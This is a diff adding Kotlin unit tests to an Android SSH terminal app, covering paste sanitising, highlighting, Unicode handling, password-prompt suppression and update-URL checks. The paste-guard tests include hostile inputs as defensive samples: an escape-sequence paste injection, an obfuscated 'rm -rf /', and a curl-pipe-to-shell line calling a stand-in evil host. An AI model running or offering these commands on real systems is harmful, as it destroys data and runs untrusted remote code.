@@ -234,4 +234,176 @@ class TerminalAndGuardTest {
         assertEquals("", rowText(99))
         assertEquals("root@srv:~# ls -la\napp.log\nWARN disk 90%", ctrl.extractPlainText(0))
     }
+
+    @Test
+    fun pasteGuardBlocksNestedEscapesControlCharsAndPurifiedDangers() {
+        // Nested bracketed-paste escape injection & C1 0x9B
+        val nested = "\u001B[20\u001B[201~1~\nid\n"
+        val sanitized = PasteGuard.sanitizePasteText(nested)
+        assertFalse(sanitized.contains("\u001B[201~"))
+        assertFalse(sanitized.contains("\u001B[200~"))
+        assertEquals("\nid\n", sanitized)
+
+        val c1Nested = "\u009B20\u009B201~1~\nid\n"
+        val c1Sanitized = PasteGuard.sanitizePasteText(c1Nested)
+        assertFalse(c1Sanitized.contains("\u009B201~"))
+        assertEquals("\nid\n", c1Sanitized)
+
+        val escInsp = PasteGuard.inspect(nested, bracketedPasteActive = true)
+        assertTrue(escInsp.needsConfirm)
+        assertTrue(escInsp.warnings.any { it.kind == PasteWarningKind.DANGER })
+
+        val c1Insp = PasteGuard.inspect("\u009B201~\nid\n", bracketedPasteActive = true)
+        assertTrue(c1Insp.needsConfirm)
+        assertTrue(c1Insp.warnings.any { it.kind == PasteWarningKind.DANGER })
+
+        val c0Insp = PasteGuard.inspect("echo \u0007hi", bracketedPasteActive = true)
+        assertTrue(c0Insp.needsConfirm)
+        assertTrue(c0Insp.warnings.any { it.kind == PasteWarningKind.DANGER })
+
+        // Zero-width obfuscated dangerous commands must be caught both before & after purify
+        val obfRm = "r\u200Bm -rf /"
+        val rmInsp = PasteGuard.inspect(obfRm, bracketedPasteActive = true)
+        assertTrue(rmInsp.hasHiddenChars)
+        assertTrue(rmInsp.warnings.any { it.kind == PasteWarningKind.HIDDEN_CHARS })
+        assertTrue(rmInsp.warnings.any { it.kind == PasteWarningKind.DANGER })
+        assertTrue(PasteGuard.inspect(PasteGuard.stripHiddenChars(obfRm), true).warnings.any { it.kind == PasteWarningKind.DANGER })
+
+        val obfPipe = "cu\u200Brl https://evil.test/x | sh"
+        val pipeInsp = PasteGuard.inspect(obfPipe, bracketedPasteActive = true)
+        assertTrue(pipeInsp.warnings.any { it.kind == PasteWarningKind.PIPE_SHELL })
+
+        val obfHomo = "a\u200B\u0430"
+        val homoInsp = PasteGuard.inspect(obfHomo, bracketedPasteActive = true)
+        assertTrue(homoInsp.warnings.any { it.kind == PasteWarningKind.HOMOGLYPH })
+    }
+
+    @Test
+    fun keywordHighlighterPreservesSplitOscDcsApcAndLongStrings() {
+        val session = KeywordHighlighter.Session()
+        val p1 = session.highlight("\u001B]0;root@10.0.0.1: /var/log/error")
+        val p2 = session.highlight("\u0007ERROR")
+        assertEquals("", p1)
+        assertEquals("\u001B]0;root@10.0.0.1: /var/log/error\u0007\u001B[38;5;203mERROR\u001B[39m", p2)
+
+        // Split DCS with ST split across chunks
+        val d1 = session.highlight("\u001BP+q544e error\u001B")
+        val d2 = session.highlight("\\OK")
+        assertEquals("", d1)
+        assertEquals("\u001BP+q544e error\u001B\\\u001B[38;5;114mOK\u001B[39m", d2)
+
+        // Over-512B split OSC must not inject SGR into payload
+        val longPayload = "x".repeat(600) + " error 10.0.0.1"
+        val l1 = session.highlight("\u001B]52;c;$longPayload")
+        val l2 = session.highlight("\u0007WARN")
+        assertFalse(l1.contains("\u001B[38;5;"))
+        assertTrue(l2.contains("\u001B[38;5;221mWARN\u001B[39m"))
+    }
+
+    @Test
+    fun unicodeEmojiSurrogatesCombiningAndScrollbackResize() {
+        assertEquals(2, codePointWidth(0x1F680)) // 🚀
+        assertEquals(2, codePointWidth(0x2705)) // ✅
+        assertEquals(2, codePointWidth(0x26A1)) // ⚡
+        assertEquals(0, codePointWidth(0xFE0F)) // VS16
+        assertEquals(0, codePointWidth(0x0301)) // combining acute
+        assertEquals(0, codePointWidth(0x200D)) // ZWJ
+
+        val ctrl = TerminalSessionController("uni1", initialCols = 20, initialRows = 6, keywordHighlightEnabled = { false })
+        // Include split UTF-16 surrogate pair across two chunks + combining diacritic + VS16 emoji
+        val rocket = "\uD83D\uDE80"
+        ctrl.onRemoteOutput("hi ${rocket[0]}")
+        ctrl.onRemoteOutput("${rocket[1]}e\u0301 \u26A0\uFE0F \u2705")
+        val snap = ctrl.snapshot()
+        assertEquals(0x1F680, snap.lines[0][3].codePoint)
+        assertTrue(snap.lines[0][3].isWide)
+        assertTrue(snap.lines[0][4].isContinuation)
+        assertEquals('e'.code, snap.lines[0][5].codePoint)
+        assertEquals("\u0301", snap.lines[0][5].combining)
+        assertEquals("hi \uD83D\uDE80e\u0301 \u26A0\uFE0F \u2705", ctrl.extractPlainText())
+
+        // Selection starting on wide continuation cell snaps back to lead cell
+        val sel = TextSelection(CellPos(0, 4), CellPos(0, 5))
+        assertEquals("\uD83D\uDE80e\u0301", TerminalSelectionHelper.extractText(snap, sel))
+
+        // Resize shrinking height pushes top rows to scrollback instead of discarding active prompt
+        val rCtrl = TerminalSessionController("resize1", initialCols = 20, initialRows = 10, keywordHighlightEnabled = { false })
+        rCtrl.onRemoteOutput((0..8).joinToString("\r\n") { "line-$it" })
+        assertEquals(8, rCtrl.cursorPosition().first)
+        rCtrl.resize(20, 5)
+        assertEquals(4, rCtrl.cursorPosition().first)
+        val after = rCtrl.snapshot(0)
+        assertEquals(4, after.scrollbackSize)
+        assertEquals("line-4\nline-5\nline-6\nline-7\nline-8", rCtrl.extractPlainText(0))
+        assertTrue(rCtrl.extractPlainText(4).startsWith("line-0\nline-1"))
+    }
+
+    @Test
+    fun reconnectResetAndSensitiveCommandSuppression() {
+        val recorded = mutableListOf<String>()
+        val ctrl = TerminalSessionController(
+            sessionId = "sec1",
+            initialCols = 40,
+            initialRows = 8,
+            keywordHighlightEnabled = { true },
+            onCommandCommitted = { recorded.add(it) }
+        )
+
+        // Normal shell prompt records normal commands, ignores leading spaces
+        ctrl.onRemoteOutput("root@password-srv:~$ ")
+        ctrl.onLocalInput("ls -la\r")
+        ctrl.onLocalInput(" export SECRET=123\r")
+        ctrl.onLocalInput("\thidden-cmd\r")
+        assertEquals(listOf("ls -la"), recorded)
+
+        // Password / passphrase / OTP prompts suppress recording
+        ctrl.onRemoteOutput("\r\n[sudo] password for root: ")
+        ctrl.onLocalInput("MySudoPass!\r")
+        ctrl.onRemoteOutput("\r\nEnter passphrase for key '/root/.ssh/id_ed25519': ")
+        ctrl.onLocalInput("MyKeyPass!\r")
+        ctrl.onRemoteOutput("\r\nVerification code: ")
+        ctrl.onLocalInput("123456\r")
+        ctrl.onRemoteOutput("\r\n请输入密码：")
+        ctrl.onLocalInput("cnPass\r")
+        assertEquals(listOf("ls -la"), recorded)
+
+        // Bracketed paste payload does not commit embedded newlines
+        ctrl.onRemoteOutput("\r\nroot@srv:~$ \u001B[?2004h")
+        assertTrue(ctrl.isBracketedPasteEnabled())
+        ctrl.onLocalInput("\u001B[200~echo 1\necho 2\u001B[201~")
+        assertEquals(listOf("ls -la"), recorded)
+
+        // Reconnect reset clears alt-screen, modes, margins, and incomplete DCS/STR_SKIP
+        ctrl.onRemoteOutput("\u001B[?1049h\u001B[?1h\u001B[?1000h\u001B[?1006h\u001B[?2004h\u001B[2;5r\u001BPdangling")
+        assertTrue(ctrl.isAlternateScreen())
+        assertTrue(ctrl.isApplicationCursorKeys())
+        assertTrue(ctrl.isMouseTrackingEnabled())
+        assertTrue(ctrl.isSgrMouseMode())
+
+        ctrl.resetForReconnect("reconnected-ok")
+        assertFalse(ctrl.isAlternateScreen())
+        assertFalse(ctrl.isApplicationCursorKeys())
+        assertFalse(ctrl.isMouseTrackingEnabled())
+        assertFalse(ctrl.isSgrMouseMode())
+        assertFalse(ctrl.isBracketedPasteEnabled())
+        assertTrue(ctrl.extractPlainText().contains("reconnected-ok"))
+    }
+
+    @Test
+    fun updateCheckerValidatesTrustedGithubUrls() {
+        assertTrue(UpdateChecker.isTrustedReleaseUrl("https://github.com/yellowdking/GravitySSH-Android/releases/tag/v1.1.2"))
+        assertTrue(UpdateChecker.isTrustedReleaseUrl("https://github.com/yellowdking/GravitySSH-Android/releases/download/v1.1.2/GravitySSH-1.1.2-release.apk"))
+        assertFalse(UpdateChecker.isTrustedReleaseUrl("http://github.com/yellowdking/GravitySSH-Android/releases/tag/v1.1.2"))
+        assertFalse(UpdateChecker.isTrustedReleaseUrl("https://user@github.com/yellowdking/GravitySSH-Android/releases/tag/v1.1.2"))
+        assertFalse(UpdateChecker.isTrustedReleaseUrl("https://github.com:8443/yellowdking/GravitySSH-Android/releases/tag/v1.1.2"))
+        assertFalse(UpdateChecker.isTrustedReleaseUrl("https://github.com:443/yellowdking/GravitySSH-Android/releases/tag/v1.1.2"))
+        assertFalse(UpdateChecker.isTrustedReleaseUrl("https://github.com/attacker/GravitySSH-Android/releases/download/v2/x.apk"))
+        assertFalse(UpdateChecker.isTrustedReleaseUrl("https://github.com/yellowdking/GravitySSH-Android/releases/../evil/x.apk"))
+
+        assertTrue(UpdateChecker.isTrustedApiRedirectUrl("https://api.github.com/repositories/12345/releases/latest"))
+        assertFalse(UpdateChecker.isTrustedApiRedirectUrl("http://api.github.com/repositories/12345/releases/latest"))
+        assertFalse(UpdateChecker.isTrustedApiRedirectUrl("https://evil.example.com/releases/latest"))
+        assertFalse(UpdateChecker.isTrustedApiRedirectUrl("https://user@api.github.com/repositories/12345/releases/latest"))
+        assertFalse(UpdateChecker.isTrustedApiRedirectUrl("https://api.github.com:8443/repositories/12345/releases/latest"))
+    }
 }
